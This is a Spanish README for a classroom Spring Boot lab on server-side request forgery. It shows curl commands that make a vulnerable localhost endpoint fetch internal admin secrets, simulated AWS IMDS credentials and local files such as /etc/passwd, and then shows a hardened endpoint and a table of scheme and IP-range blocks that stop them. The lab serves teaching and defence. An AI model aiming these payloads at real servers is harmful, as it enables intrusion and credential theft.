# Demostración en Vivo: Server-Side Request Forgery (SSRF) - OWASP Top 10:2021 (A10)

Proyecto didáctico en **Java Spring Boot 3** diseñado para la evaluación de la **Unidad de Competencia 2 (UC2)** de la asignatura de **Ciberseguridad Aplicada**. Demuestra de manera práctica e interactiva la vulnerabilidad de **Falsificación de Peticiones del Lado del Servidor (Server-Side Request Forgery - SSRF)**, su **impacto en arquitecturas web y cloud**, y la **mitigación en profundidad (Defense in Depth)** conforme a las recomendaciones de **OWASP**.

---

## 🎯 Objetivos de Aprendizaje

1. **Comprender el concepto y vector de ataque de SSRF**:
   - Qué ocurre cuando el servidor backend realiza peticiones HTTP/recursos remotos basándose en una URL suministrada por el usuario sin validación.
2. **Evaluar el Impacto Real de SSRF**:
   - **Salto del perímetro de red (Intranet bypass)**: Acceso a microservicios, bases de datos o paneles internos no expuestos a Internet.
   - **Extracción de metadatos en la nube (Cloud Instance Metadata Exfiltration)**: Ataque contra servicios IMDS (ej. `http://169.254.169.254` en AWS/GCP/Azure) para el robo de claves temporales de IAM.
   - **Lectura arbitraria de archivos locales (Local File Read)**: Explotación mediante protocolos no HTTP (`file:///`).
   - **Escaneo de puertos internos y servicios huérfanos**.
3. **Implementar y contrastar las Mitigaciones recomendadas por OWASP**:
   - Lista blanca de protocolos (*Scheme Whitelisting* - solo `http` y `https`).
   - Resolución DNS previa y bloqueo exhaustivo de rangos IP peligrosos (*Loopback*, *RFC 1918*, *Link-Local / Metadata*).
   - Desactivación de redirecciones HTTP automáticas (*Anti-Redirect Bypass*).
   - Desacoplamiento de credenciales y *timeouts* estrictos.

---

## 🏗️ Estructura del Proyecto

El código fuente está organizado didácticamente para contrastar los escenarios inseguros vs seguros:

```text
Server-Side Request Forgery (SSRF)/
│
├── pom.xml                            # Configuración Maven (Spring Boot 3.3.4, Java 17/21)
├── postman_collection.json            # Colección lista para importar en Postman
├── README.md                          # Guía didáctica para el laboratorio y la exposición
│
└── src/
    ├── main/
    │   ├── resources/
    │   │   └── application.properties # Configuración del servidor (puerto 8080)
    │   └── java/com/ciberseguridad/ssrf/
    │       ├── Application.java               # Punto de arranque Spring Boot
    │       ├── SecurityConfig.java            # Control de accesos perimetrales y Basic Auth
    │       ├── GlobalExceptionHandler.java    # Formateo amigable de alertas de seguridad
    │       │
    │       ├── internal/                      # 🏢 RECURSOS PRIVADOS DE LA INTRANET
    │       │   └── InternalAdminController.java   # Simula servicios de claves internas y Cloud Metadata
    │       │
    │       ├── vulnerable/                    # 🔴 CÓDIGO VULNERABLE A SSRF
    │       │   └── SsrfControllerVulnerable.java  # Fetcher sin validación que confía en el cliente
    │       │
    │       └── mitigado/                      # 🟢 CÓDIGO MITIGADO Y SEGURO
    │           ├── SsrfValidatorService.java      # Validador de esquemas, DNS y rangos IP peligrosos
    │           └── SsrfControllerSeguro.java      # Fetcher robusto con defensa en profundidad
    │
    └── test/java/com/ciberseguridad/ssrf/
        └── SsrfDemonstrationTest.java         # Pruebas automatizadas (JUnit 5 + Spring Boot Test)
```

---

## 👥 Usuarios de Prueba Precargados

| Usuario | Contraseña | Rol en Spring Security | Descripción en el Laboratorio |
| :--- | :--- | :--- | :--- |
| `alumno` | `password` | `ROLE_USER` | **Atacante / Usuario Estándar** (No tiene permisos de intranet ni administración). |
| `admin` | `password` | `ROLE_ADMIN` | **Administrador** (Acceso legítimo a la intranet). |
| `sistema-interno` | `internal-secret-token-xyz` | `ROLE_INTERNAL_SYSTEM` | **Servicio del Sistema** (Utilizado por microservicios autorizados). |

---

## 🚀 Requisitos Previos e Instalación

- **JDK 17 o superior** (compatible con JDK 21).
- **Apache Maven 3.8+**.
- Terminal de comandos (**PowerShell**, **Bash** o **CMD**) con `curl` disponible.

### Paso 1: Navegar a la carpeta del proyecto
```bash
cd "Server-Side Request Forgery (SSRF)"
```

### Paso 2: Ejecutar las pruebas automatizadas
Para validar que tanto el ataque vulnerable como las mitigaciones funcionan correctamente:
```bash
mvn clean test
```
*(Verás 7 pruebas automatizadas pasando con resultado `BUILD SUCCESS`)*.

### Paso 3: Iniciar el servidor Spring Boot
```bash
mvn spring-boot:run
```
La aplicación quedará escuchando en `http://localhost:8080`.

---

## 🧪 Guía de Demostración en Vivo (Paso a Paso con cURL)

Abre una terminal mientras el servidor está en ejecución.

---

### 🔵 PARTE 1: Verificación de la Protección Perimetral Directa

Demuestra a la clase que el endpoint de la intranet (`/internal/admin/claves-api`) está debidamente protegido y que un usuario estándar no puede acceder directamente:

```bash
curl -i -u alumno:password http://localhost:8080/internal/admin/claves-api
```
**Resultado esperado:** HTTP `403 Forbidden` 🛡️
```json
{
  "status": 403,
  "error": "Forbidden",
  "alertaSeguridad": "ACCESO DENEGADO PERIMETRAL",
  "mensaje": "El usuario actual no tiene permisos para acceder a recursos de administración o servicios internos directamente."
}
```
> **Explicación para la clase:** El control de acceso perimetral bloquea al alumno porque solo tiene `ROLE_USER`.

---

### 🔴 PARTE 2: Demostración del Impacto de SSRF (Endpoint Vulnerable)

Ahora el atacante utiliza la funcionalidad de previsualización/descarga de URLs del servidor (`/api/vulnerable/preview` o `/api/vulnerable/fetch-url`), obligando al backend a realizar la petición en su nombre.

#### 2.1. Salto de Perímetro (Intranet Bypass): Extracción de claves secretas
El alumno envía como parámetro la URL interna que antes le dio 403 Forbidden:
```bash
curl -i -u alumno:password "http://localhost:8080/api/vulnerable/preview?url=http://localhost:8080/internal/admin/claves-api"
```
**Resultado vulnerable:** HTTP `200 OK` ⚠️
```json
{
  "estado": "ÉXITO_VULNERABLE",
  "urlConsultada": "http://localhost:8080/internal/admin/claves-api",
  "codigoHttpRemoto": 200,
  "contenidoRecuperado": "{\"servicio\":\"Bóveda de Credenciales Corporativas (Intranet Interna)\",\"estado\":\"CONFIDENCIAL - USO EXCLUSIVO INTERNO\",\"database_host\":\"db-prod.internal.corp:5432\",\"database_password\":\"SuperSecretPostgres2026!#\",\"stripe_api_key\":\"sk_live_51M0xDemoSecretKeyProd999\",\"jwt_secret_signing_key\":\"ultra-secret-hmac-sha256-key-ciberseguridad\"}",
  "advertencia": "⚠️ EL SERVIDOR EJECUTÓ LA PETICIÓN INTERNA SIN VERIFICAR EL DESTINO."
}
```
> **Explicación del Impacto:** El atacante ha robado la contraseña de la base de datos de producción y la clave secreta de Stripe, saltándose el firewall perimetral porque la llamada fue emitida desde el propio servidor.

#### 2.2. Extracción de Metadatos de la Nube (AWS IMDS / Cloud Metadata)
En entornos cloud (como AWS EC2), el servicio de metadatos reside en la IP no enrutable `169.254.169.254`. En el laboratorio simulamos este endpoint en `/latest/meta-data/iam/security-credentials`:
```bash
curl -i -u alumno:password "http://localhost:8080/api/vulnerable/preview?url=http://localhost:8080/latest/meta-data/iam/security-credentials"
```
**Resultado vulnerable:** HTTP `200 OK` ⚠️
```json
{
  "estado": "ÉXITO_VULNERABLE",
  "codigoHttpRemoto": 200,
  "contenidoRecuperado": "{\"Code\":\"Success\",\"Type\":\"AWS-HMAC\",\"RoleName\":\"Production-App-Server-Role\",\"AccessKeyId\":\"ASIAEXAMPLEACCESSKEY99\",\"SecretAccessKey\":\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\"Token\":\"IQoJb3JpZ2luX2VjEIz...[Token Temporal IAM]\"}"
}
```
> **Explicación del Impacto:** Este es el vector de ataque exacto con el que atacantes robaron más de 100 millones de registros en la fuga de Capital One, extrayendo credenciales IAM de rol de máquina para comprometer toda la infraestructura AWS.

#### 2.3. Lectura de Archivos Locales del Servidor (Esquema `file://`)
El atacante aprovecha que el servidor no restringe protocolos e inyecta el esquema `file://`:
- En Windows:
```bash
curl -i -u alumno:password "http://localhost:8080/api/vulnerable/preview?url=file:///C:/Windows/win.ini"
```
- En Linux/macOS:
```bash
curl -i -u alumno:password "http://localhost:8080/api/vulnerable/preview?url=file:///etc/passwd"
```
**Resultado vulnerable:** HTTP `200 OK` ⚠️
El servidor abre el flujo de entrada local y expone los contenidos del sistema de archivos.

---

### 🟢 PARTE 3: Demostración de las Mitigaciones (Endpoint Seguro)

Ahora ejecutamos los mismos ataques contra el controlador protegido `/api/mitigado/preview`.

#### 3.1. Intento de SSRF a Metadatos Bloqueado
```bash
curl -i -u alumno:password "http://localhost:8080/api/mitigado/preview?url=http://localhost:8080/latest/meta-data/iam/security-credentials"
```
**Resultado mitigado:** HTTP `400 Bad Request` 🛡️
```json
{
  "status": 400,
  "error": "Bad Request",
  "alertaSeguridad": "VULNERABILIDAD SSRF BLOQUEADA 🛡️",
  "motivo": "Acceso bloqueado: No se permite realizar peticiones hacia localhost o loopback."
}
```

#### 3.2. Intento de SSRF por IP Loopback (127.0.0.1) Bloqueado
```bash
curl -i -u alumno:password "http://localhost:8080/api/mitigado/preview?url=http://127.0.0.1:8080/internal/admin/claves-api"
```
**Resultado mitigado:** HTTP `400 Bad Request` 🛡️
```json
{
  "status": 400,
  "error": "Bad Request",
  "alertaSeguridad": "VULNERABILIDAD SSRF BLOQUEADA 🛡️",
  "motivo": "Acceso bloqueado: No se permite realizar peticiones hacia localhost o loopback."
}
```

#### 3.3. Intento de Protocolo no permitido (`file://`) Bloqueado
```bash
curl -i -u alumno:password "http://localhost:8080/api/mitigado/preview?url=file:///C:/Windows/win.ini"
```
**Resultado mitigado:** HTTP `400 Bad Request` 🛡️
```json
{
  "status": 400,
  "error": "Bad Request",
  "alertaSeguridad": "VULNERABILIDAD SSRF BLOQUEADA 🛡️",
  "motivo": "Protocolo 'file' no permitido. Solo se aceptan HTTP y HTTPS."
}
```

#### 3.4. Petición Legítima a Servicio Externo Autorizado
Un servicio público legítimo sin IPs privadas sí puede ser consultado:
```bash
curl -i -u alumno:password "http://localhost:8080/api/mitigado/preview?url=https://httpbin.org/get"
```
**Resultado:** HTTP `200 OK` ✅
```json
{
  "estado": "ÉXITO_SEGURO",
  "proteccion": "🛡️ Destino analizado y certificado: IP externa y pública permitida."
}
```

---

## 📮 Demostración desde Postman (Colección Lista para Usar)

El proyecto incluye el archivo `postman_collection.json` configurado:
1. Abre **Postman**.
2. Presiona el botón **Import** y selecciona el archivo `postman_collection.json`.
3. Encontrarás tres carpetas estructuradas:
   - `🔴 1. Escenarios Vulnerables (SSRF)`: Consultas de ataque a metadatos, intranet y lectura de archivos.
   - `🟢 2. Escenarios Mitigados (Seguros)`: Bloqueos correspondientes con código 400 y mensaje de seguridad.
   - `🔵 3. Verificación de Control Perimetral Directo`: Comprobación del bloqueo 403 al alumno en llamadas directas.
4. Todas las solicitudes vienen con la autenticación HTTP Basic (`alumno:password`) configurada.

---

## 🛡️ Matriz de Mitigaciones en Profundidad (Defense in Depth)

| Capa de Defensa | Mecanismo Implementado | Vector que Previene |
| :--- | :--- | :--- |
| **1. Esquema / Protocolo** | Whitelist estricta: Solo `http` y `https` | Lectura de archivos locales (`file://`), payloads a Redis (`gopher://`), diccionarios (`dict://`). |
| **2. Resolución DNS & IP Check** | `InetAddress.getAllByName(host)` y validación de rangos | Ataques a Loopback (`127.0.0.1`, `localhost`, `::1`), IPs privadas RFC 1918 (`10.x`, `172.16.x`, `192.168.x`). |
| **3. Bloqueo de Link-Local** | Filtrado de `169.254.0.0/16` | Extracción de metadatos en AWS EC2, GCP y Azure (IMDSv1). |
| **4. Redirecciones HTTP** | `setInstanceFollowRedirects(false)` | Ataques por rebote (*Redirect Bypass*) donde un servidor externo devuelve `302 Location: http://localhost`. |
| **5. Timeouts y Concurrencia** | `setConnectTimeout(3000)` y `setReadTimeout(3000)` | Denegación de servicio (DoS) por puertos filtrados o *Blind SSRF port scanning*. |
| **6. Lista Blanca de Dominios** | Validación opcional contra socios comerciales permitidos | Limita el consumo exclusivamente a dominios corporativos autorizados. |

---

## 📚 Conclusiones Teóricas para la Exposición

1. **La falacia de la seguridad perimetral**: Confiar en firewalls perimetrales sin validar las llamadas salientes del backend es el error fundamental que permite SSRF. El servidor web es un ciudadano de primera clase dentro de la intranet.
2. **Impacto en Entornos Cloud (OWASP A10:2021)**: SSRF subió al Top 10 principalmente por la adopción masiva de la nube. Si no se implementa **IMDSv2** (que exige tokens en encabezados PUT) ni validación en el código, una sola vulnerabilidad SSRF puede comprometer toda la cuenta cloud de la empresa.
3. **Defense in Depth**: Nunca confíes en una simple lista negra basada en regex de `"localhost"`, ya que los atacantes pueden eludirla usando representaciones alternativas (`127.0.0.1`, `0.0.0.0`, `::1`, notación hexadecimal o *DNS Rebinding*). La validación debe resolverse a nivel de IP antes de abrir el socket de red.
